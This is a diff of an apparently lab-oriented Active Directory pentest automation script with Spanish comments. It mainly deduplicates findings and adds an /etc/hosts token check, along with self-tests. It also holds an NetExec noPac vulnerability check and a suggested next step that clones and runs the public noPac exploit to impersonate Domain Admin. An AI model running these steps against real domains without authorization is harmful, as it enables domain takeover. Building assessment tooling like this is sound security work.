@@ -6773,10 +6773,14 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                 _step(res, f"{nxc} smb {ip} {shown_auth} -M nopac", npvuln, mask(out),
                       note="noPac (CVE-2021-42278/42287): ¿puede esta cuenta de dominio estándar suplantar "
                            "a un DC y escalar directamente a Domain Admin?")
-                if npvuln:
-                    res["findings"].append(("critica",
+                # noPac es una vuln del DC, NO de la credencial: da igual cuántas cuentas lo
+                # confirmen, es UN solo hallazgo. Antes se añadía por-credencial sin marcador (al
+                # revés que MAQ/Domain Admins/lockout, que sí deduplican), así que con 2+ credenciales
+                # salía 2+ veces. Ahora va por _add_once con marcador "noPac" — y el next-step solo
+                # se añade con él, para no duplicarlo tampoco.
+                if npvuln and _add_once(res, "critica",
                         f"SMB (cred {u}): ¡noPac! DC vulnerable a CVE-2021-42278/42287 — impersonar Domain "
-                        "Admin desde una cuenta de dominio estándar"))
+                        "Admin desde una cuenta de dominio estándar", "noPac", seen):
                     res["next"].append(
                         "git clone https://github.com/Ridter/noPac && python3 noPac/noPac.py "
                         f"DOMINIO/{shlex.quote(u)}:*** -dc-ip {ip} -dc-host DC_HOSTNAME --impersonate "
@@ -8083,10 +8087,13 @@ def provided_creds_check(ip, services, creds, bulk=None, local_auth=False, is_ha
                         os.unlink(sec_file.name)
                     except OSError:
                         pass
-            # La CONTRASEÑA aportada se MUESTRA (es del propio operador y el sentido de esta fase es
-            # ver CUÁL de las probadas funciona; enmascararla la dejaba inservible). El HASH (PtH) sí
-            # se enmascara: un NTLM es tan reutilizable como la contraseña y no aporta verlo escrito.
-            masked = f"{u}:{'∅' if p == '' else ('***' if is_hash else p)}"
+            # La CREDENCIAL aportada se MUESTRA en el hallazgo (contraseña O hash): es input del
+            # propio operador y el sentido de esta fase es ver CUÁL de las probadas funciona —
+            # enmascarar el hash dejaba el hallazgo inservible («mssqlsvc:***» no dice cuál era, y
+            # un PtH se identifica por el hash igual que una cred por la contraseña). Pedido en
+            # vivo ("se esconde el hash"). La salida cruda del paso sí sigue enmascarando el hash
+            # (safe_out, más abajo) por higiene del volcado, pero el hallazgo lo enseña.
+            masked = f"{u}:{'∅' if p == '' else p}"
             shown_sec = ("-H " + ("''" if not p else "'***'")) if is_hash else \
                         ("-p " + ("''" if p == "" else shlex.quote(p)))
             shown = f"{nxc} {np} {ip} -u {shlex.quote(u)} {shown_sec}"
@@ -11974,6 +11981,10 @@ def selftest():
     _hcmds_shown = " ".join(s["cmd"] for s in _hres[0]["steps"])
     assert "31d6cfe0d16ae931b73c59d7e0c089c0" not in _hcmds_shown         # pero el comando GUARDADO (lo que ve el informe) lo enmascara
     assert "'***'" in _hcmds_shown
+    # El HALLAZGO sí muestra el hash aportado: es input del operador y sirve para ver CUÁL cred
+    # funcionó (pedido en vivo, "se esconde el hash" — antes salía «admin:***», inservible).
+    _hfind = " ".join(t for _s, t in _hres[0]["findings"])
+    assert "admin:31d6cfe0d16ae931b73c59d7e0c089c0" in _hfind, _hfind
 
     # _cmd_label: etiqueta de los latidos de progreso — lo CRÍTICO es que NUNCA filtre la
     # credencial (un 'GetUserSPNs dominio/user:pass' la lleva en el argv posicional).
@@ -12972,6 +12983,16 @@ def selftest():
     _make_hostname_symlinks(str(_sym_dir), "10.10.10.12", ["dc01.nexura.htb"])
     assert (_sym_dir / "dc01.nexura.htb").resolve() == (_sym_dir / "10.10.10.11").resolve()   # intacto
 
+    # _hosts_has: ¿un hostname ya está en /etc/hosts como TOKEN completo? (no subcadena)
+    _ht = "127.0.0.1 localhost\n172.16.7.3 dc01.inlanefreight.local inlanefreight.local\n# 10.0.0.9 commented.htb\n"
+    assert _hosts_has("dc01.inlanefreight.local", _ht)
+    assert _hosts_has("inlanefreight.local", _ht)            # apex, presente como token propio
+    assert _hosts_has("INLANEFREIGHT.LOCAL", _ht)            # case-insensitive
+    assert not _hosts_has("commented.htb", _ht)              # en un comentario: NO cuenta
+    assert not _hosts_has("lanefreight.local", _ht)          # subcadena de otro token: NO es falso positivo
+    # el bug viejo: 'inlanefreight.local' NO debe darse por presente solo por estar 'sub.inlanefreight.local'
+    assert not _hosts_has("inlanefreight.local", "172.16.7.9 sub.inlanefreight.local\n")
+
     # --resume real: _ports_signature + _resume_reuse_ok deciden si footprint/searchsploit/
     # creds por defecto se reutilizan del findings.json anterior en vez de repetirse.
     _svcs_a = [{"port": 445, "proto": "tcp"}, {"port": 53, "proto": "udp"}]
@@ -13062,6 +13083,29 @@ def selftest():
     # Exactamente la MISMA entrada repetida (misma credencial re-probada) no se duplica.
     _mcp_dup = _merge_creds_provided_footprint(_mcp_old, dict(_mcp_old))
     assert len(_mcp_dup["findings"]) == 1 and len(_mcp_dup["steps"]) == 1
+
+    # _norm_finding_key + dedup de nivel-dominio en la fusión: un hallazgo "(cred X)" (noPac,
+    # Domain Admins, MAQ, sin bloqueo…) NO se duplica entre run viejo y nuevo solo porque dos
+    # credenciales distintas lo confirmaron — es propiedad del dominio. Los per-credencial de
+    # verdad («X:pass», Pwn3d!) SÍ se conservan por separado.
+    assert _norm_finding_key(("critica", "SMB (cred BR086): ¡noPac! DC vulnerable")) \
+        == _norm_finding_key(("critica", "SMB (cred mssqlsvc): ¡noPac! DC vulnerable"))
+    assert _norm_finding_key(("alta", "LDAP: credencial aportada válida — «BR086:x»")) \
+        != _norm_finding_key(("alta", "LDAP: credencial aportada válida — «mssqlsvc:y»"))   # per-cred: no colapsa
+    _dom_old = {"proto": "reuse-smb", "title": "x", "ports": [445], "steps": [], "missing": [], "next": [],
+                "findings": [["critica", "SMB (cred BR086): ¡noPac! DC vulnerable a CVE-2021-42278/42287"],
+                             ["alta", "AD (cred BR086): 'Domain Admins' — 1 miembro(s): Administrator"],
+                             ["alta", "SMB: credencial aportada válida — «BR086:Welcome1»"]]}
+    _dom_new = {"proto": "reuse-smb", "title": "x", "ports": [445], "steps": [], "missing": [], "next": [],
+                "findings": [("critica", "SMB (cred mssqlsvc): ¡noPac! DC vulnerable a CVE-2021-42278/42287"),
+                             ("alta", "AD (cred mssqlsvc): 'Domain Admins' — 1 miembro(s): Administrator"),
+                             ("alta", "SMB: credencial aportada válida — «mssqlsvc:***»")]}
+    _dom = _merge_creds_provided_footprint(_dom_old, _dom_new)
+    _dom_txt = [t for _s, t in _dom["findings"]]
+    assert sum("noPac" in t for t in _dom_txt) == 1, _dom_txt          # noPac: UNA vez (nivel dominio)
+    assert sum("'Domain Admins'" in t for t in _dom_txt) == 1, _dom_txt  # Domain Admins: UNA vez
+    assert any("BR086:Welcome1" in t for t in _dom_txt)               # las credenciales válidas de AMBOS se conservan
+    assert any("mssqlsvc" in t for t in _dom_txt)
 
     # Regresión CRÍTICA: el informe "temprano" de run_one (antes de la Fase 5, con banner +
     # auto-refresh) NO debe vaciar findings.json en un --resume con datos previos buenos. El bug:
@@ -14086,6 +14130,20 @@ def preflight(args, check_all=False, check_only=False):
     return True
 
 
+def _hosts_has(domain, text):
+    """¿El hostname `domain` ya está en el contenido de /etc/hosts como TOKEN completo (uno de
+    los nombres tras la IP), no como subcadena de otro? Ignora comentarios y es case-insensitive.
+    Antes se usaba un regex con \\b que daba un falso positivo: 'inlanefreight.local' casaba dentro
+    de 'dc01.inlanefreight.local' (el '.' cuenta como frontera de palabra), así que el apex se
+    daba por presente aunque solo estuviera el subdominio. Puro → testeable sin red."""
+    dl = domain.lower()
+    for line in text.splitlines():
+        toks = line.split("#", 1)[0].split()   # fuera el comentario; IP + hostnames
+        if len(toks) >= 2 and dl in (t.lower() for t in toks[1:]):
+            return True
+    return False
+
+
 def maybe_add_hosts(ip, domains, args):
     """Ofrece añadir los dominios/hostnames descubiertos a /etc/hosts (desbloquea el
     fuzzing de vhosts y el acceso por nombre). Con confirmación; --add-hosts lo hace
@@ -14097,9 +14155,15 @@ def maybe_add_hosts(ip, domains, args):
         current = hosts.read_text()
     except OSError:
         return
-    missing = [d for d in domains if not re.search(rf"(?m)^\S+\s+.*\b{re.escape(d)}\b", current)]
+    present = [d for d in domains if _hosts_has(d, current)]
+    missing = [d for d in domains if d not in present]
     if not missing:
+        if present:   # ya estaban todas: dilo en vez de callar, para que se vea que se comprobó
+            info(f"(/etc/hosts) ya está: «{ip} {' '.join(present)}» — no hace falta añadir nada.")
         return
+    if present:   # algunas ya estaban, otras no: dilo para que no parezca que se duplica
+        info(f"(/etc/hosts) ya estaba{'n' if len(present) > 1 else ''}: {', '.join(present)} — "
+             f"solo falta(n): {', '.join(missing)}")
     line = f"{ip} {' '.join(missing)}"
     # Memoria por-IP de un "no": maybe_add_hosts se llama DOS veces por objetivo (dominios
     # descubiertos, y luego los vhosts del fuzzing). Si ya dijiste que no para esta IP, no
@@ -14431,6 +14495,17 @@ def _norm_fp(f):
     return f
 
 
+_CRED_TAG_RE = re.compile(r"\(cred [^)]+\)")
+
+
+def _norm_finding_key(f):
+    """Clave para deduplicar un hallazgo colapsando la credencial concreta: '(cred mssqlsvc)' y
+    '(cred BR086)' → '(cred)'. Así un hallazgo de nivel-dominio (mismo texto salvo la credencial)
+    cuenta como UNO. Un hallazgo sin '(cred X)' (los per-credencial de verdad: «X:pass», Pwn3d!)
+    se queda tal cual. Puro → testeable sin red."""
+    return (f[0], _CRED_TAG_RE.sub("(cred)", f[1]))
+
+
 def _merge_creds_provided_footprint(old, new):
     """Combina el footprint-dict de credenciales aportadas (Fase 5d, proto 'reuse-*'/'creds-*')
     de un --resume ANTERIOR con el de ESTE run para el MISMO protocolo — ACUMULA en vez de
@@ -14447,9 +14522,16 @@ def _merge_creds_provided_footprint(old, new):
     seen_steps = {(s.get("cmd"), s.get("output")) for s in new.get("steps", [])}
     merged["steps"] = list(new.get("steps", [])) + [
         s for s in old.get("steps", []) if (s.get("cmd"), s.get("output")) not in seen_steps]
-    seen_find = {tuple(f) for f in new.get("findings", [])}
+    # Dedup de hallazgos por clave NORMALIZADA: "(cred <X>)" → "(cred)", para que un hallazgo de
+    # nivel-DOMINIO (noPac, Domain/Enterprise Admins, MachineAccountQuota, sin bloqueo, N usuarios
+    # del dominio, política…) no se duplique solo porque dos credenciales distintas lo confirmaron
+    # en runs distintos — es una propiedad del dominio/DC, no de la credencial. Los hallazgos
+    # GENUINAMENTE por-credencial ("credencial aportada válida — «X:pass»", Pwn3d!) NO llevan
+    # "(cred X)" (la credencial va en «X:...»), así que no se colapsan. Se queda el de NEW (más
+    # reciente); se descarta el de OLD que normaliza a lo mismo.
+    seen_find = {_norm_finding_key(f) for f in new.get("findings", [])}
     merged["findings"] = list(new.get("findings", [])) + [
-        f for f in old.get("findings", []) if tuple(f) not in seen_find]
+        f for f in old.get("findings", []) if _norm_finding_key(f) not in seen_find]
     seen_next = set(new.get("next", []))
     merged["next"] = list(new.get("next", [])) + [n for n in old.get("next", []) if n not in seen_next]
     merged["missing"] = sorted(set(old.get("missing", [])) | set(new.get("missing", [])))
